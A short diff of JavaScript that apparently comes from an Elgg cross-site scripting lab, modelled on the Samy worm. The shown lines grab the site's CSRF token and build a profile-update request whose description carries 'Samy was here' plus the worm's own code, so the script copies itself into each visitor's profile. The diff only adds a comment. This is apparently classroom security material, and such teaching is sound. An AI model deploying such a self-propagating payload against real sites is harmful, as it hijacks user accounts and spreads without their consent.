@@ -12,7 +12,7 @@ window.onload = function() {
  var token="&__elgg_token="+elgg.security.token.__elgg_token;
  var description="description=Samy was here"+wormCode;
  
- 
+ //test
  
  var content=description+userName+guid+ts+token;
  var samyGuid=59;
